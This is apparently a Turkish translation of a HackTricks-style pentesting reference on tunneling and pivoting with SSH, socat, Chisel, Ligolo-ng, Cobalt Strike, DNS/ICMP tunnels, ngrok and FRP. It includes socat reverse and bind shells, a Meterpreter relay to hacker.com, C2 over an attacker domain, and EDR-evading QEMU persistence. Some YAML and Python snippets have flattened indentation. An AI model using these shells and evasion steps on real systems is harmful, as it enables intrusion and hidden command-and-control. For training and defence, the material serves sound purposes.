# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap ipucu

> [!WARNING]
> **ICMP** ve **SYN** taramaları socks proxies üzerinden tünellenemez, bu yüzden bunun çalışması için **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve **TCP taramalarını** (`-sT`) belirtmeliyiz.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafiksel bağlantı (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Server'da yeni Port aç --> Diğer port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Yerel port --> Ele geçirilmiş host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Local Port --> Ele geçirilmiş host (SSH) --> Her yere
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Bu, internal hosts üzerinden DMZ aracılığıyla host'unuza reverse shells almak için kullanışlıdır:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Her iki cihazda da **root** olmanız gerekir (yeni arayüzler oluşturacağınız için) ve sshd config root login'e izin vermelidir:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Sunucu tarafında yönlendirmeyi etkinleştir
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
İstemci tarafında yeni bir rota ayarla
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> The 2023 Terrapin downgrade attack, bir man-in-the-middle'in erken SSH handshake'ını değiştirmesine ve **herhangi bir iletilen kanala** (`-L`, `-R`, `-D`) veri enjekte etmesine izin verebilir. SSH tünellerine güvenmeden önce hem client hem server'ın yamalı (**OpenSSH ≥ 9.6/LibreSSH 6.7**) olduğundan emin olun veya `sshd_config`/`ssh_config` içinde savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını açıkça devre dışı bırakın.

## SSHUTTLE

Bir host üzerinden bir **alt ağa** giden **tüm trafik**i **ssh** ile **tünelleyebilirsiniz**.\
Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek için
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Özel anahtar ile bağlan
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Yerel port --> Ele geçirilmiş host (aktif session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Başka bir yol:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

teamserver üzerinde, tüm arayüzlerde dinleyen ve trafiği **beacon** üzerinden yönlendirmek için kullanılabilecek bir port açın.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Bu durumda **port is opened in the beacon host**, Team Server'da değil açılır; trafik Team Server'a gönderilir ve oradan belirtilen host:port adresine iletilir.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Dikkat:

- Beacon'ın reverse port forward'ı **trafikleri Team Server'a tünellemek için tasarlanmıştır, bireysel makineler arasında aktarma için değil**.
- Trafik, P2P linkleri dahil olmak üzere **Beacon'ın C2 trafiği içinde tünellenir**.
- Yüksek portlarda reverse port forward oluşturmak için **Admin privileges gerekli değildir**.

### rPort2Port local

> [!WARNING]
> Bu durumda, **port beacon host üzerinde açılır**, Team Server üzerinde değil ve **trafik Cobalt Strike client'a gönderilir** (Team Server'a değil) ve oradan belirtilen host:port'a
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Bir web dosya tüneli yüklemeniz gerekiyor: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Bunu [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\ adresindeki releases sayfasından indirebilirsiniz\
Client ve server için **aynı sürümü kullanmanız gerekiyor**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Agent ve proxy için aynı sürümü kullanın**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Bağlama ve Dinleme
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Ajanın Yerel Portlarına Erişim
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Tünel victim tarafından başlatılır.\
127.0.0.1:1080 üzerinde bir socks4 proxy oluşturulur
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot aracılığıyla **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port socks üzerinden
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter SSL Socat aracılığıyla
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Hedefin konsolunda son satırın yerine bu satırı çalıştırarak bir **non-authenticated proxy**'yi atlatabilirsiniz:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Her iki tarafta da sertifikalar oluşturun: Client ve Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Yerel SSH portu (22)'yi attacker host'un 443 portuna bağlayın
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Konsol PuTTY sürümü gibidir (seçenekler bir ssh client ile çok benzerdir).

Bu binary victim üzerinde çalıştırılacağı ve bir ssh client olduğu için reverse connection alabilmemiz için ssh servisimizi ve portumuzu açmamız gerekir. Sonra, sadece locally accessible portu kendi makinemizdeki bir porta forward etmek için:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Herhangi bir port için local admin olmanız gerekir
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Sisteme **RDP erişiminiz** olmalıdır.\
İndir:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç Windows'un Remote Desktop Service özelliğindeki `Dynamic Virtual Channels` (`DVC`)'yi kullanır. DVC, **RDP bağlantısı üzerinden paketlerin tünellenmesinden** sorumludur.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

İstemci bilgisayarınızda **`SocksOverRDP-Plugin.dll`**'ü şu şekilde yükleyin:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Artık **mstsc.exe** kullanarak **RDP** üzerinden **victim** ile **connect** olabiliriz; bir **prompt** almalı ve bunun **SocksOverRDP plugin is enabled** olduğunu bildiren bir mesaj görmeliyiz; ayrıca **127.0.0.1:1080** üzerinde **listen** edecektir.

**Connect** ile **RDP** üzerinden bağlanın ve victim makinesine `SocksOverRDP-Server.exe` binary'sini yükleyip çalıştırın:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Şimdi, kendi makinenizde (attacker) 1080 numaralı portun dinlemede olduğunu doğrulayın:
```
netstat -antb | findstr 1080
```
Artık [**Proxifier**](https://www.proxifier.com/) **trafiği o port üzerinden proxy'leyebilirsiniz.**

## Proxify Windows GUI Uygulamaları

Windows GUI uygulamalarını [**Proxifier**](https://www.proxifier.com/) kullanarak bir proxy üzerinden yönlendirebilirsiniz.\
**Profile -> Proxy Servers** bölümüne SOCKS sunucusunun IP'sini ve portunu ekleyin.\
**Profile -> Proxification Rules** bölümüne proxify yapmak istediğiniz programın adını ve proxify etmek istediğiniz IP'lere olan bağlantıları ekleyin.

## NTLM proxy bypass

Daha önce bahsedilen araç: **Rpivot**\
**OpenVPN** ayrıca bunu atlatabilir; yapılandırma dosyasına şu seçenekleri ekleyerek:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Proxy'ye karşı kimlik doğrulaması yapar ve yerel olarak bir port bağlar; bu port sizin belirttiğiniz dış hizmete yönlendirilir. Daha sonra, bu port üzerinden tercih ettiğiniz tool'u kullanabilirsiniz.\
Örneğin bu, port 443'ü yönlendirir.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Şimdi, örneğin victim üzerinde **SSH** servisini port 443'te dinleyecek şekilde ayarlarsanız, attacker üzerinden port 2222 ile ona bağlanabilirsiniz.  
Ayrıca localhost:443'e bağlanan ve attacker'ın port 2222'de dinlediği bir **meterpreter** de kullanabilirsiniz.

## YARP

Microsoft tarafından oluşturulmuş bir reverse proxy. Burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Her iki sistemde de tun adapters oluşturmak ve DNS sorguları kullanarak aralarında veri tünellemek için Root gereklidir.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
The tunnel çok yavaş olacaktır. Bu tunnel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Buradan indir**](https://github.com/iagox86/dnscat2)**.**

DNS üzerinden bir C\&C kanalı oluşturur. root privileges gerektirmez.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell'de**

PowerShell'de bir dnscat2 istemcisi çalıştırmak için [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kullanabilirsiniz:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding ile dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS'ini Değiştirme

Proxychains, `gethostbyname` libc çağrısını yakalar ve tcp DNS isteklerini socks proxy üzerinden tüneller. Varsayılan olarak proxychains'in kullandığı **DNS** sunucusu **4.2.2.2** (hardcoded). Değiştirmek için şu dosyayı düzenleyin: _/usr/lib/proxychains3/proxyresolv_ ve IP'yi değiştirin. Eğer bir **Windows environment** içindeyseniz **domain controller**'ın IP'sini ayarlayabilirsiniz.

## Go'da Tüneller

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Özel DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 aktörü, yalnızca çıkış yönlü **DNS** ve **plain HTTP POST** trafiğini kötüye kullanan çift kanallı bir C2 ("AK47C2") oluşturdu — kurumsal ağlarda nadiren engellenen iki protokol.

1. **DNS modu (AK47DNS)**
• Rastgele 5 karakterlik bir SessionID üretir (ör. `H4T14`).
• Görev istekleri için başa `1`, sonuçlar için `2` ekler ve farklı alanları (flags, SessionID, bilgisayar adı) birleştirir.
• Her alan **ASCII anahtar `VHBD@H` ile XOR şifrelemesi** uygulanır, hex kodlanır ve noktalarla birleştirilir — en sonunda saldırgan kontrolündeki domaine sonlanır:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• İstekler **TXT** (ve geri dönüş için **MG**) kayıtları için `DnsQuery()` kullanır.
• Yanıt 0xFF baytı aştığında backdoor veriyi 63 baytlık parçalara böler ve C2 sunucusunun yeniden sıralayabilmesi için `s<SessionID>t<TOTAL>p<POS>` işaretleyicilerini ekler.

2. **HTTP modu (AK47HTTP)**
• Bir JSON zarfı oluşturur:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Tüm blob XOR-`VHBD@H` → hex → olarak kodlanıp `Content-Type: text/plain` başlığı ile **`POST /`** gövdesi olarak gönderilir.
• Yanıt aynı kodlamayı izler ve `cmd` alanı `cmd.exe /c <command> 2>&1` ile çalıştırılır.

Blue Team notları
• İlk etiketi uzun hexadecimal olan ve her zaman nadir bir domaine sonlanan olağandışı **TXT sorgularını** arayın.
• Sabit bir XOR anahtarı ve ardından ASCII-hex, YARA ile tespit edilmesi kolaydır: `6?56484244?484` (`VHBD@H` hex olarak).
• HTTP için, saf hex olan ve iki byte'ın katı olan text/plain POST gövdelerini işaretleyin.

{{#note}}
Tüm kanal **standart RFC-uyumlu sorgular** içinde kalır ve her alt alan etiketi 63 baytın altında tutulur; bu da çoğu DNS kaydında gizlenmesini sağlar.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Tun adaptörleri oluşturmak ve ICMP echo istekleri kullanarak aralarında veri tünellemek için her iki sistemde de root gereklidir.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Buradan indirin**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **tek bir komutla çözümleri İnternet'e açmaya yarayan bir araçtır.**\
_Erişim URI'leri şöyle olur:_ **UID.ngrok.io**

### Kurulum

- Hesap oluşturun: https://ngrok.com/signup
- İstemci indirme:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Temel kullanımlar

**Dokümantasyon:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Gerekirse kimlik doğrulama ve TLS eklemek de mümkündür._

#### TCP Tünelleme
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP ile dosyaların açığa çıkarılması
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP çağrıları

_XSS,SSRF,SSTI ... için kullanışlı_\
Doğrudan stdout'dan veya HTTP arayüzünde [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling dahili HTTP servisi
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml basit yapılandırma örneği

3 tünel açar:

- 2 TCP
- 1 HTTP (statik dosyaları /tmp/httpbin/ dizininden sunar)
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare’ın `cloudflared` daemon'u, Cloudflare’ın edge'ini buluşma noktası olarak kullanarak inbound firewall kuralları gerektirmeden **local TCP/UDP services**'i açan outbound tüneller oluşturabilir. Bu, egress firewall yalnızca HTTPS trafiğine izin veriyorsa ancak inbound bağlantılar engellenmişse çok kullanışlıdır.

### Hızlı tek satırlık tünel komutu
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNS ile kalıcı tüneller
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Bağlayıcıyı başlatın:
```bash
cloudflared tunnel run mytunnel
```
Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) aktif olarak bakım yapılan bir Go reverse-proxy'dir ve **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**'i destekler. **v0.53.0 (May 2024)** ile başlayarak **SSH Tunnel Gateway** olarak davranabilir, böylece hedef host sadece stock OpenSSH client kullanarak bir reverse tunnel başlatabilir — ekstra bir binary gerekmez.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Yeni SSH ağ geçidini kullanma (frpc binary yok)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Yukarıdaki komut, kurbanın portu **8080**'i herhangi bir ek araç dağıtmadan **attacker_ip:9000** olarak yayımlar — living-off-the-land pivoting için ideal.

## QEMU ile Gizli VM Tabanlı Tüneller

QEMU’nin user-mode networking (`-netdev user`) seçeneği `hostfwd` adında bir opsiyonu destekler; bu seçenek **bir TCP/UDP portunu *host* üzerinde bağlar ve bunu *guest* içine yönlendirir***. Guest tam bir SSH daemon’u çalıştırdığında, hostfwd kuralı size tamamen geçici bir VM içinde yaşayan kullanılabilir bir SSH jump box sağlar — tüm kötü amaçlı etkinlik ve dosyalar sanal diskte kaldığı için C2 trafiğini EDR'den gizlemek için mükemmeldir.

### Hızlı one-liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Yukarıdaki komut RAM'de bir **Tiny Core Linux** imajını (`tc.qcow2`) başlatır.
• Windows host üzerindeki **2222/tcp** portu misafir içindeki **22/tcp**'ye şeffaf şekilde yönlendirilir.
• Saldırganın bakış açısından hedef yalnızca 2222 portunu açmış görünür; ona ulaşan paketlerin tümü VM'de çalışan SSH sunucusu tarafından işlenir.

### VBScript ile gizlice başlatma
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs` ile scripti çalıştırmak pencereyi gizli tutar.

### Konuk (guest) kalıcılığı

Tiny Core durumsuz (stateless) olduğu için, saldırganlar genellikle:

1. Payload'ı `/opt/123.out` konumuna bırakırlar.
2. `/opt/bootlocal.sh` dosyasına eklerler:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Kapatma sırasında payload'ın `mydata.tgz` içine paketlenmesi için `home/tc` ve `opt`'u `/opt/filetool.lst`'e eklerler.

### Neden bu tespiti atlatır

• Diskle etkileşime giren sadece iki imzasız yürütülebilir dosya (`qemu-system-*.exe`) vardır; sürücü veya servis kurulmaz.  
• Hosttaki güvenlik ürünleri **zararsız loopback trafiği** görür (gerçek C2 VM içinde sonlanır).  
• Bellek tarayıcıları kötü amaçlı işlem alanını analiz etmez çünkü işlem farklı bir OS'ta çalışır.

### Savunmacı ipuçları

• Kullanıcı tarafından yazılabilir dizinlerde bulunan **beklenmedik QEMU/VirtualBox/KVM binaries** için alarm oluşturun.  
• Kaynağı `qemu-system*.exe` olan giden bağlantıları engelleyin.  
• QEMU başlatıldıktan hemen sonra bağlanan nadir dinleme portlarını (2222, 10022, …) avlayın.

## IIS/HTTP.sys relay düğümleri via `HttpAddUrl` (ShadowPad)

Ink Dragon'ın ShadowPad IIS modülü, HTTP.sys katmanında gizli URL öneklerini doğrudan bağlayarak her ele geçirilmiş çevre web sunucusunu çift amaçlı **backdoor + relay** haline getirir:

* **Config defaults** – modülün JSON konfigürasyonu değerleri atladığında, makul IIS varsayılanlarına döner (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Böylece zararsız trafik IIS tarafından doğru markalama ile cevaplanır.  
* **Wildcard interception** – operatörler noktalı virgülle ayrılmış bir URL öneki listesi sağlar (host + path içinde wildcard'lar). Modül her giriş için `HttpAddUrl` çağırır, böylece HTTP.sys eşleşen istekleri IIS modüllerine ulaşmadan *before* (önce) kötü amaçlı işleyiciye yönlendirir.  
* **Encrypted first packet** – istek gövdesinin ilk iki baytı özel 32-bit PRNG için tohum taşır. Sonraki her bayt, protokol ayrıştırılmadan önce üretilen keystream ile XOR'lanır:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

